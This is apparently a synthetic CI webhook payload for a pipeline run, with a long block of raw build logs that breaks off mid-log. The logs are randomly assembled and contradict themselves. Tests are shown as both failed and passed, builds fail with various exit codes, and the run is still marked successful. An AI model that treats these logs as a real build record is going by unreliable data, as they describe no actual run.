{
  "action": "completed",
  "workflow_run": {
    "id": 858,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-490",
    "head_sha": "c6342ae8c7e5830245667d2af4e5465f218b4832",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-14T12:00:35.128776Z",
    "updated_at": "2025-12-14T12:03:03.009085Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "frank"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: checkout ===\nWARNING: react has known vulnerabilities\n\u2713 lint completed\nWARNING: jest has known vulnerabilities\nCompiling src/app.ts...\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (34MB)\nCache hit for key-1479\n[12:00:35] INFO: Processing request\nInstalling lodash@2.17.0\n[12:00:35] WARN: Deprecated API usage\nInstalling express@4.9.0\nStep 9/10: Building\nCompiling src/handler.rs...\nInstalling react@4.1.0\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 build completed\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling jest@2.3.0\nArtifact uploaded: build.tar.gz (42MB)\nStep 1/10: Building\nCache hit for key-6534\nInstalling jest@3.20.0\n\u2713 test completed\nStep 7/10: Building\nStep 8/10: Building\n  PASS: test_api_health (128ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (43MB)\n  PASS: test_user_create (59ms)\n[12:00:35] INFO: Processing request\n  PASS: test_api_health (332ms)\n[12:00:35] INFO: Processing request\n\u2713 build completed\nStep 8/10: Building\n\u2713 lint completed\n[12:00:35] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (14MB)\n\u2713 test completed\n[12:00:35] INFO: Processing request\nCompiling src/utils.go...\n[12:00:35] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (44MB)\nArtifact uploaded: build.tar.gz (43MB)\n  PASS: test_db_connect (165ms)\nFAILED: test_cache_hit\n  PASS: test_cache_hit (233ms)\nCompiling src/service.java...\n  PASS: test_user_create (229ms)\nCompiling src/handler.rs...\n[12:00:35] INFO: Processing request\nStep 5/10: Building\nStep 2/10: Building\nCache hit for key-5063\n  PASS: test_cache_hit (127ms)\n\u2713 lint completed\nCompiling src/main.py...\n\u2713 test completed\nCache hit for key-7224\nCompiling src/index.js...\nCache hit for key-3471\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nCache hit for key-9835\n[12:00:35] ERROR: Connection failed\n[12:00:35] INFO: Processing request\n\u2713 build completed\n[12:00:35] INFO: Processing request\nStep 2/10: Building\nCache hit for key-2588\nCache hit for key-8947\nStep 5/10: Building\nStep 8/10: Building\n\u2713 test completed\n[12:00:35] INFO: Processing request\nInstalling webpack@1.13.0\n[12:00:35] INFO: Processing request\n\u2713 build completed\nWARNING: axios has known vulnerabilities\n[12:00:35] WARN: Deprecated API usage\nCache hit for key-4789\n[12:00:35] INFO: Processing request\nInstalling prettier@3.0.0\nArtifact uploaded: build.tar.gz (15MB)\n\u2713 build completed\nCache hit for key-2228\nCompiling src/service.java...\nCache hit for key-3754\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (31MB)\nArtifact uploaded: build.tar.gz (40MB)\nStep 3/10: Building\nCompiling src/service.java...\n  PASS: test_user_create (399ms)\nArtifact uploaded: build.tar.gz (37MB)\nCache hit for key-2648\nCache hit for key-2314\n[12:00:35] INFO: Processing request\nInstalling prettier@5.6.0\nArtifact uploaded: build.tar.gz (40MB)\nCache hit for key-8271\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/index.js...\nCache hit for key-2590\n\u2713 test completed\n\u2717 build failed with exit code 97\n\u2713 test completed\nStep 8/10: Building\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nInstalling webpack@1.9.0\nCache hit for key-8335\n  PASS: test_auth_login (85ms)\n[12:00:35] INFO: Processing request\nStep 3/10: Building\nStep 4/10: Building\nStep 10/10: Building\nInstalling lodash@5.10.0\nCompiling src/index.js...\nCompiling src/utils.go...\n  PASS: test_api_health (452ms)\nCache hit for key-6169\n[12:00:35] INFO: Processing request\nInstalling express@1.9.0\nCompiling src/index.js...\nCompiling src/main.py...\nStep 2/10: Building\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 test completed\n=== Step checkout completed ===\n=== Step: restore_cache ===\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (46MB)\n  PASS: test_auth_login (379ms)\nCache hit for key-7619\nCompiling src/main.py...\n  PASS: test_user_create (2ms)\nFAILED: test_auth_login\n  PASS: test_api_health (312ms)\n\u2713 test completed\nInstalling jest@4.13.0\n[12:00:35] INFO: Processing request\nWARNING: eslint has known vulnerabilities\n  PASS: test_cache_hit (312ms)\n\u2713 build completed\nCompiling src/main.py...\n  PASS: test_auth_login (256ms)\nArtifact uploaded: build.tar.gz (25MB)\n  PASS: test_cache_hit (266ms)\nStep 2/10: Building\nInstalling eslint@2.3.0\nInstalling express@3.19.0\nCache hit for key-6908\nStep 2/10: Building\nStep 5/10: Building\nCompiling src/index.js...\n\u2713 test completed\n[12:00:35] INFO: Processing request\nInstalling prettier@2.18.0\nArtifact uploaded: build.tar.gz (44MB)\nCache hit for key-7516\nCompiling src/utils.go...\n[12:00:35] INFO: Processing request\n  PASS: test_auth_login (153ms)\n[12:00:35] ERROR: Connection failed\nInstalling jest@3.20.0\nArtifact uploaded: build.tar.gz (18MB)\nInstalling lodash@2.7.0\nCache hit for key-4662\n\u2713 build completed\nStep 1/10: Building\n\u2717 build failed with exit code 57\n  PASS: test_api_health (381ms)\nCache hit for key-2047\nStep 2/10: Building\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (13MB)\nArtifact uploaded: build.tar.gz (34MB)\nArtifact uploaded: build.tar.gz (38MB)\nException: TypeError\nStep 2/10: Building\n\u2713 test completed\nStep 7/10: Building\n  PASS: test_api_health (226ms)\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:35] WARN: Deprecated API usage\nCompiling src/index.js...\nStep 6/10: Building\nCache hit for key-4053\nWARNING: jest has known vulnerabilities\nInstalling jest@3.10.0\nCache hit for key-4936\n\u2713 test completed\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-9426\n[12:00:35] INFO: Processing request\nCompiling src/app.ts...\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nStep 10/10: Building\n\u2713 test completed\nInstalling eslint@1.12.0\n[12:00:35] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_db_connect (350ms)\nCache hit for key-9366\n  PASS: test_auth_login (56ms)\nStep 4/10: Building\n[12:00:35] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (49MB)\n[12:00:35] INFO: Processing request\nInstalling eslint@1.0.0\nInstalling prettier@4.19.0\n\u2713 lint completed\nCache hit for key-8784\nStep 1/10: Building\nInstalling axios@4.4.0\n  PASS: test_user_create (459ms)\n\u2713 test completed\n[12:00:35] INFO: Processing request\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (33MB)\n\u2713 test completed\nStep 6/10: Building\n  PASS: test_api_health (492ms)\nStep 8/10: Building\n\u2713 lint completed\nInstalling jest@3.12.0\nArtifact uploaded: build.tar.gz (2MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\nStep 9/10: Building\n  PASS: test_api_health (357ms)\n  PASS: test_auth_login (16ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (43MB)\nInstalling react@2.6.0\nCache hit for key-7480\n\u2713 lint completed\nWARNING: prettier has known vulnerabilities\n  PASS: test_cache_hit (61ms)\nArtifact uploaded: build.tar.gz (7MB)\n  PASS: test_db_connect (415ms)\nArtifact uploaded: build.tar.gz (45MB)\n[12:00:35] INFO: Processing request\nStep 8/10: Building\nCompiling src/app.ts...\nCompiling src/index.js...\nInstalling eslint@4.1.0\nInstalling axios@2.14.0\n\u2713 build completed\nFAILED: test_user_create\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (3MB)\nCompiling src/utils.go...\nWARNING: jest has known vulnerabilities\nStep 1/10: Building\nWARNING: express has known vulnerabilities\n=== Step restore_cache completed ===\n=== Step: integration_tests ===\nCompiling src/service.java...\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 lint completed\n[12:00:35] INFO: Processing request\nInstalling jest@5.1.0\n\u2713 lint completed\nCache hit for key-3845\n\u2713 build completed\n[12:00:35] INFO: Processing request\nCompiling src/app.ts...\nCache hit for key-7128\n\u2713 build completed\n  PASS: test_db_connect (120ms)\nInstalling lodash@1.7.0\n[12:00:35] INFO: Processing request\nStep 6/10: Building\nStep 1/10: Building\nInstalling prettier@1.17.0\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\nStep 9/10: Building\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (8MB)\n\u2717 build failed with exit code 109\n  PASS: test_user_create (464ms)\nStep 9/10: Building\nStep 3/10: Building\n[12:00:35] INFO: Processing request\n\u2713 build completed\n[12:00:35] INFO: Processing request\n  PASS: test_db_connect (442ms)\n\u2713 build completed\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (5MB)\nCompiling src/utils.go...\nCompiling src/service.java...\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (26MB)\n  PASS: test_db_connect (176ms)\nStep 7/10: Building\n  PASS: test_db_connect (187ms)\n[12:00:35] INFO: Processing request\nInstalling react@1.16.0\nWARNING: axios has known vulnerabilities\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (3MB)\n[12:00:35] WARN: Deprecated API usage\nStep 1/10: Building\nCompiling src/index.js...\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (416ms)\nWARNING: eslint has known vulnerabilities\n\u2713 test completed\n\u2713 build completed\n  PASS: test_cache_hit (261ms)\nInstalling express@4.17.0\n[12:00:35] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (19MB)\n\u2713 test completed\nFAILED: test_user_create\n\u2713 build completed\nWARNING: axios has known vulnerabilities\nInstalling eslint@3.19.0\nCache hit for key-2419\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:35] WARN: Deprecated API usage\n  PASS: test_cache_hit (354ms)\nCompiling src/service.java...\n  PASS: test_auth_login (212ms)\nArtifact uploaded: build.tar.gz (2MB)\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (5MB)\n\u2717 build failed with exit code 104\nCompiling src/index.js...\nInstalling axios@1.5.0\nCache hit for key-9499\nCache hit for key-9497\n  PASS: test_user_create (302ms)\nInstalling webpack@1.2.0\nArtifact uploaded: build.tar.gz (9MB)\nWARNING: jest has known vulnerabilities\nStep 5/10: Building\n  PASS: test_auth_login (409ms)\nCompiling src/service.java...\nCache hit for key-5060\nCache hit for key-8137\n\u2713 lint completed\nCache hit for key-7371\nWARNING: lodash has known vulnerabilities\nCache hit for key-9968\n[12:00:35] INFO: Processing request\n[12:00:35] ERROR: Connection failed\nInstalling prettier@2.18.0\nCompiling src/index.js...\nStep 2/10: Building\nCache hit for key-2161\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (9MB)\nException: NullPointerException\nArtifact uploaded: build.tar.gz (31MB)\nArtifact uploaded: build.tar.gz (45MB)\nException: RuntimeError\nCompiling src/main.py...\n  PASS: test_cache_hit (313ms)\nArtifact uploaded: build.tar.gz (43MB)\nInstalling eslint@1.7.0\n  PASS: test_api_health (431ms)\nCompiling src/app.ts...\nStep 10/10: Building\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (37MB)\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nCompiling src/service.java...\n  PASS: test_api_health (71ms)\nCompiling src/handler.rs...\nStep 4/10: Building\n[12:00:35] WARN: Deprecated API usage\nCompiling src/service.java...\nCache hit for key-3510\n  PASS: test_cache_hit (118ms)\n[12:00:35] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/utils.go...\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:35] INFO: Processing request\nStep 4/10: Building\nCache hit for key-5081\n=== Step integration_tests completed ===\n=== Step: save_cache ===\nArtifact uploaded: build.tar.gz (21MB)\nCache hit for key-4930\nWARNING: express has known vulnerabilities\n  PASS: test_db_connect (113ms)\nStep 6/10: Building\nCompiling src/service.java...\nCache hit for key-1415\n[12:00:35] INFO: Processing request\n  PASS: test_db_connect (67ms)\n\u2713 build completed\n[12:00:35] WARN: Deprecated API usage\nCompiling src/index.js...\nFAILED: test_api_health\nCache hit for key-1920\nCache hit for key-3797\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (32MB)\n  PASS: test_auth_login (53ms)\nInstalling lodash@4.18.0\nCache hit for key-5417\n  PASS: test_db_connect (180ms)\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (30MB)\nArtifact uploaded: build.tar.gz (30MB)\n\u2713 build completed\n\u2713 lint completed\nCompiling src/utils.go...\n\u2713 build completed\nCache hit for key-2530\nWARNING: react has known vulnerabilities\n  PASS: test_db_connect (209ms)\n\u2713 lint completed\nStep 6/10: Building\n[12:00:35] INFO: Processing request\nException: TypeError\n\u2713 lint completed\nCache hit for key-8239\nInstalling jest@1.20.0\n  PASS: test_db_connect (103ms)\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling eslint@1.5.0\n\u2713 lint completed\nInstalling lodash@4.12.0\nInstalling lodash@1.4.0\nCompiling src/utils.go...\nInstalling react@3.4.0\nCache hit for key-5552\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n  PASS: test_api_health (15ms)\n[12:00:35] INFO: Processing request\n\u2713 test completed\nInstalling eslint@3.0.0\n[12:00:35] INFO: Processing request\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\nCompiling src/main.py...\nStep 6/10: Building\nInstalling lodash@4.19.0\nCache hit for key-3787\nArtifact uploaded: build.tar.gz (6MB)\nCompiling src/service.java...\nCompiling src/main.py...\nCompiling src/main.py...\n  PASS: test_cache_hit (166ms)\n[12:00:35] ERROR: Connection failed\n\u2713 test completed\nCache hit for key-2427\n[12:00:35] INFO: Processing request\nFAILED: test_user_create\nStep 6/10: Building\n\u2713 build completed\nCompiling src/service.java...\nCompiling src/service.java...\n[12:00:35] ERROR: Connection failed\n[12:00:35] WARN: Deprecated API usage\nCache hit for key-3478\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (37MB)\nStep 4/10: Building\nCompiling src/index.js...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (10MB)\nCache hit for key-8950\nCompiling src/index.js...\n[12:00:35] INFO: Processing request\nCache hit for key-8429\n  PASS: test_user_create (500ms)\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (21MB)\n[12:00:35] INFO: Processing request\n\u2717 build failed with exit code 124\n[12:00:35] INFO: Processing request\nStep 9/10: Building\n  PASS: test_auth_login (267ms)\nCompiling src/index.js...\n[12:00:35] INFO: Processing request\nInstalling eslint@2.18.0\nCompiling src/app.ts...\nStep 10/10: Building\nCache hit for key-9208\n[12:00:35] WARN: Deprecated API usage\nCache hit for key-7181\nStep 8/10: Building\nStep 6/10: Building\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (2MB)\nCache hit for key-9332\n  PASS: test_db_connect (360ms)\nArtifact uploaded: build.tar.gz (3MB)\n[12:00:35] INFO: Processing request\n  PASS: test_api_health (369ms)\n\u2713 build completed\n\u2713 build completed\nStep 8/10: Building\nCompiling src/handler.rs...\n[12:00:35] INFO: Processing request\nInstalling eslint@5.19.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling axios@3.20.0\nInstalling jest@5.4.0\nCompiling src/app.ts...\n\u2713 test completed\n[12:00:35] INFO: Processing request\nInstalling prettier@4.11.0\n\u2713 build completed\n  PASS: test_api_health (16ms)\n=== Step save_cache completed ===\n=== Step: e2e_tests ===\nArtifact uploaded: build.tar.gz (19MB)\nArtifact uploaded: build.tar.gz (24MB)\nInstalling axios@3.6.0\nCache hit for key-9833\n\u2713 build completed\nArtifact uploaded: build.tar.gz (13MB)\n[12:00:35] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (22MB)\nException: RuntimeError\nArtifact uploaded: build.tar.gz (28MB)\nArtifact uploaded: build.tar.gz (50MB)\nCompiling src/service.java...\nStep 6/10: Building\nCache hit for key-1350\nStep 7/10: Building\n  PASS: test_cache_hit (379ms)\n\u2713 build completed\nInstalling axios@3.15.0\nCache hit for key-2722\nArtifact uploaded: build.tar.gz (45MB)\nCompiling src/main.py...\nInstalling webpack@2.15.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (25MB)\n  PASS: test_auth_login (341ms)\nCache hit for key-5340\n  PASS: test_cache_hit (6ms)\n[12:00:35] INFO: Processing request\n\u2713 test completed\nCompiling src/index.js...\nCompiling src/utils.go...\n  PASS: test_api_health (270ms)\n\u2713 build completed\n[12:00:35] WARN: Deprecated API usage\nCache hit for key-9001\nCache hit for key-5599\nCompiling src/handler.rs...\nStep 1/10: Building\nCache hit for key-1619\nInstalling webpack@5.2.0\nCompiling src/app.ts...\n\u2713 lint completed\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nCache hit for key-5816\nInstalling eslint@1.19.0\n  PASS: test_user_create (292ms)\nArtifact uploaded: build.tar.gz (42MB)\nInstalling react@4.18.0\nStep 3/10: Building\n\u2713 lint completed\nStep 8/10: Building\nCompiling src/handler.rs...\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (20MB)\nInstalling jest@5.0.0\nArtifact uploaded: build.tar.gz (44MB)\nStep 3/10: Building\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (33MB)\nCache hit for key-1373\nArtifact uploaded: build.tar.gz (21MB)\n[12:00:35] INFO: Processing request\n\u2713 test completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: test_db_connect (235ms)\nArtifact uploaded: build.tar.gz (36MB)\nArtifact uploaded: build.tar.gz (4MB)\nStep 6/10: Building\n  PASS: test_user_create (412ms)\nInstalling axios@4.18.0\n\u2713 build completed\nInstalling eslint@2.5.0\n\u2713 lint completed\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (10MB)\nStep 7/10: Building\nInstalling jest@1.12.0\n\u2713 lint completed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (29MB)\n\u2713 lint completed\nCompiling src/handler.rs...\nInstalling axios@2.12.0\n\u2713 lint completed\n[12:00:35] WARN: Deprecated API usage\nCache hit for key-2685\nInstalling prettier@2.2.0\nCompiling src/main.py...\n[12:00:35] ERROR: Connection failed\n\u2713 build completed\nCompiling src/main.py...\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nCache hit for key-4519\n  PASS: test_cache_hit (231ms)\n\u2713 build completed\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (47MB)\n  PASS: test_cache_hit (220ms)\n  PASS: test_api_health (22ms)\nStep 5/10: Building\nCompiling src/utils.go...\nCache hit for key-1616\nStep 3/10: Building\n  PASS: test_cache_hit (41ms)\n[12:00:35] WARN: Deprecated API usage\n\u2713 lint completed\n[12:00:35] INFO: Processing request\n  PASS: test_auth_login (488ms)\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (19MB)\n  PASS: test_db_connect (443ms)\nArtifact uploaded: build.tar.gz (5MB)\nCache hit for key-8218\nInstalling express@3.14.0\n\u2713 build completed\nCompiling src/service.java...\nCompiling src/handler.rs...\nStep 5/10: Building\nInstalling prettier@1.14.0\nStep 10/10: Building\n[12:00:35] WARN: Deprecated API usage\n\u2713 lint completed\nInstalling jest@1.5.0\nInstalling react@4.12.0\n[12:00:35] INFO: Processing request\n=== Step e2e_tests completed ===\n=== Step: build ===\n\u2713 lint completed\nInstalling webpack@2.1.0\nCache hit for key-8941\n  PASS: test_api_health (459ms)\nInstalling jest@2.12.0\nCache hit for key-9127\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (30MB)\n[12:00:35] INFO: Processing request\nCache hit for key-3626\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:35] WARN: Deprecated API usage\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:35] INFO: Processing request\nInstalling axios@3.10.0\nStep 9/10: Building\nWARNING: axios has known vulnerabilities\n  PASS: test_api_health (53ms)\nArtifact uploaded: build.tar.gz (2MB)\nCache hit for key-9792\n  PASS: test_auth_login (284ms)\nArtifact uploaded: build.tar.gz (39MB)\n[12:00:35] INFO: Processing request\nStep 10/10: Building\nInstalling lodash@3.9.0\nInstalling prettier@4.13.0\nArtifact uploaded: build.tar.gz (43MB)\nStep 7/10: Building\n\u2713 test completed\nStep 1/10: Building\n[12:00:35] INFO: Processing request\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (26MB)\nInstalling react@5.5.0\nInstalling react@5.3.0\nCompiling src/utils.go...\n  PASS: test_cache_hit (114ms)\nCompiling src/index.js...\n[12:00:35] INFO: Processing request\nCompiling src/app.ts...\n\u2713 lint completed\nCompiling src/index.js...\n  PASS: test_api_health (442ms)\n[12:00:35] WARN: Deprecated API usage\n  PASS: test_user_create (461ms)\nInstalling express@3.17.0\nCache hit for key-8743\nStep 10/10: Building\nCache hit for key-8021\nCompiling src/app.ts...\n[12:00:35] INFO: Processing request\nStep 3/10: Building\nInstalling express@4.14.0\n[12:00:35] ERROR: Connection failed\nCache hit for key-3131\nInstalling jest@5.11.0\n[12:00:35] WARN: Deprecated API usage\nStep 7/10: Building\n[12:00:35] INFO: Processing request\n\u2713 lint completed\n  PASS: test_auth_login (154ms)\nArtifact uploaded: build.tar.gz (40MB)\nCompiling src/app.ts...\n  PASS: test_auth_login (95ms)\nInstalling axios@2.18.0\nInstalling webpack@1.5.0\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (2MB)\n[12:00:35] WARN: Deprecated API usage\nCache hit for key-6216\nStep 10/10: Building\n\u2713 test completed\nFAILED: test_db_connect\nException: RuntimeError\n\u2713 lint completed\n[12:00:35] ERROR: Connection failed\nCache hit for key-6854\nCache hit for key-2592\n[12:00:35] INFO: Processing request\nInstalling jest@5.9.0\n  PASS: test_cache_hit (247ms)\nArtifact uploaded: build.tar.gz (47MB)\nStep 6/10: Building\n[12:00:35] INFO: Processing request\nException: ValueError\n[12:00:35] INFO: Processing request\nCache hit for key-8171\n  PASS: test_user_create (56ms)\n\u2713 build completed\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (42MB)\nStep 3/10: Building\nCompiling src/handler.rs...\n  PASS: test_auth_login (249ms)\nInstalling eslint@1.18.0\n  PASS: test_db_connect (458ms)\nArtifact uploaded: build.tar.gz (4MB)\nArtifact uploaded: build.tar.gz (3MB)\nCache hit for key-6798\nCompiling src/service.java...\n[12:00:35] INFO: Processing request\nInstalling express@3.17.0\nCache hit for key-6027\nInstalling prettier@5.16.0\n[12:00:35] INFO: Processing request\nStep 4/10: Building\nStep 3/10: Building\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n\u2713 lint completed\nStep 6/10: Building\nCache hit for key-2676\nWARNING: lodash has known vulnerabilities\n  PASS: test_db_connect (77ms)\n[12:00:35] INFO: Processing request\nCache hit for key-3491\nCache hit for key-2477\nFAILED: test_api_health\n  PASS: test_cache_hit (354ms)\nCompiling src/service.java...\n\u2713 test completed\nCache hit for key-3202\nCache hit for key-6185\n[12:00:35] INFO: Processing request\nInstalling prettier@5.19.0\n[12:00:35] WARN: Deprecated API usage\nCache hit for key-1963\n[12:00:35] INFO: Processing request\n\u2713 lint completed\nCompiling src/app.ts...\n\u2713 test completed\n=== Step build completed ===\n=== Step: type_check ===\nCache hit for key-5374\n  PASS: test_db_connect (412ms)\nInstalling webpack@2.20.0\n\u2713 lint completed\nStep 10/10: Building\nCache hit for key-5364\nStep 9/10: Building\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\nCompiling src/handler.rs...\nCache hit for key-7028\n  PASS: test_api_health (50ms)\n\u2713 lint completed\n[12:00:35] INFO: Processing request\nStep 10/10: Building\n\u2713 test completed\n  PASS: test_user_create (356ms)\nInstalling prettier@2.9.0\nCompiling src/main.py...\n[12:00:35] INFO: Processing request\n\u2713 lint completed\n[12:00:35] INFO: Processing request\nCompiling src/utils.go...\n[12:00:35] WARN: Deprecated API usage\n\u2713 lint completed\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (11MB)\nStep 3/10: Building\nStep 3/10: Building\nStep 2/10: Building\n\u2713 build completed\nInstalling axios@3.6.0\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-4145\nStep 5/10: Building\n\u2713 test completed\nCache hit for key-7942\nStep 8/10: Building\n  PASS: test_auth_login (154ms)\n\u2713 build completed\n[12:00:35] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_cache_hit (178ms)\nStep 1/10: Building\nCache hit for key-2174\nArtifact uploaded: build.tar.gz (25MB)\nArtifact uploaded: build.tar.gz (49MB)\nInstalling react@4.5.0\n  PASS: test_cache_hit (244ms)\n\u2713 test completed\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (1MB)\nCache hit for key-4521\nException: NullPointerException\nInstalling prettier@3.13.0\nInstalling webpack@5.0.0\nCache hit for key-3230\nInstalling react@2.17.0\nInstalling jest@3.16.0\n[12:00:35] INFO: Processing request\nCache hit for key-1436\nArtifact uploaded: build.tar.gz (14MB)\nCache hit for key-4168\nStep 6/10: Building\nCache hit for key-1387\n  PASS: test_api_health (234ms)\nCompiling src/main.py...\n\u2713 test completed\nWARNING: webpack has known vulnerabilities\nInstalling express@2.3.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2717 build failed with exit code 33\nArtifact uploaded: build.tar.gz (6MB)\nInstalling jest@5.8.0\n  PASS: test_user_create (318ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-3711\nArtifact uploaded: build.tar.gz (18MB)\n[12:00:35] INFO: Processing request\nInstalling eslint@1.4.0\nCompiling src/handler.rs...\nInstalling axios@1.0.0\n\u2713 build completed\n\u2713 build completed\nCache hit for key-1599\n  PASS: test_api_health (375ms)\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n  PASS: test_api_health (96ms)\nCache hit for key-7826\nArtifact uploaded: build.tar.gz (42MB)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (47MB)\nStep 4/10: Building\nInstalling axios@5.10.0\nFAILED: test_api_health\nCompiling src/main.py...\nInstalling webpack@5.3.0\n\u2713 test completed\n[12:00:35] WARN: Deprecated API usage\nStep 2/10: Building\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (33MB)\n\u2713 test completed\nCache hit for key-8478\n\u2713 lint completed\nCache hit for key-6327\nStep 8/10: Building\n  PASS: test_auth_login (324ms)\n\u2713 test completed\nInstalling webpack@5.16.0\nStep 1/10: Building\n  PASS: test_cache_hit (189ms)\nStep 10/10: Building\nWARNING: react has known vulnerabilities\nStep 4/10: Building\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nCompiling src/handler.rs...\nStep 6/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (36MB)\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:35] INFO: Processing request\nStep 10/10: Building\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (23MB)\n  PASS: test_cache_hit (316ms)\n[12:00:35] INFO: Processing request\n=== Step type_check completed ===\n=== Step: deploy_production ===\nCompiling src/utils.go...\n\u2713 build completed\n\u2713 build completed\nCache hit for key-4781\nCache hit for key-3542\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (12MB)\nInstalling eslint@4.4.0\n[12:00:35] WARN: Deprecated API usage\n  PASS: test_cache_hit (293ms)\nStep 2/10: Building\nStep 10/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (30MB)\nCache hit for key-4233\nCache hit for key-6437\nCompiling src/index.js...\n  PASS: test_db_connect (85ms)\n  PASS: test_cache_hit (477ms)\nInstalling webpack@4.13.0\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (38MB)\nCache hit for key-2199\n  PASS: test_cache_hit (307ms)\nArtifact uploaded: build.tar.gz (7MB)\nArtifact uploaded: build.tar.gz (37MB)\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nStep 1/10: Building\nCompiling src/handler.rs...\nCompiling src/main.py...\nException: NullPointerException\n[12:00:35] INFO: Processing request\nCompiling src/handler.rs...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (35MB)\nArtifact uploaded: build.tar.gz (10MB)\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (18MB)\n\u26a0 